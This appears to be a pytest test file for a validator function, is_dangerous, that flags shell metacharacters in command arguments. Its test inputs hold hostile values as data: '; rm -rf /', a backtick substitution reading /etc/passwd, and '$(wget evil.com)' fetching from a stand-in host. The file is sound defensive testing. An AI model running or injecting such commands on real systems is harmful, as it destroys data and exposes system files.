"""Tests for tool_core.validators.args — Category: function"""

import pytest

from tool_core.validators.args import is_dangerous


class TestIsDangerous:
    """Tests for the is_dangerous function."""

    def test_basic_execution(self):
        """Function requires arguments."""
        with pytest.raises(TypeError):
            is_dangerous()

    def test_returns_correct_type(self):
        """is_dangerous returns tuple[bool, str]."""
        result = is_dangerous(["echo", "hello"])
        assert isinstance(result, tuple)
        assert len(result) == 2
        assert isinstance(result[0], bool)
        assert isinstance(result[1], str)

    def test_is_dangerous_rejects_shell_injection(self):
        """Shell injection patterns are flagged as dangerous."""
        result, reason = is_dangerous(["echo", "; rm -rf /"])
        assert result is True
        assert "shell metacharacters" in reason or "dangerous" in reason

    def test_is_dangerous_rejects_command_substitution(self):
        """Command substitution patterns are flagged as dangerous."""
        result, reason = is_dangerous(["cat", "`cat /etc/passwd`"])
        assert result is True
        assert "shell metacharacters" in reason or "dangerous" in reason

    def test_is_dangerous_rejects_subshell(self):
        """Subshell patterns are flagged as dangerous."""
        result, reason = is_dangerous(["wget", "$(wget evil.com)"])
        assert result is True
        assert "shell metacharacters" in reason or "dangerous" in reason

    def test_is_dangerous_allows_safe_url(self):
        """Safe URLs without shell metacharacters are allowed."""
        result, reason = is_dangerous(["curl", "https://example.com/api?foo=bar"])
        assert result is False
        assert reason == ""
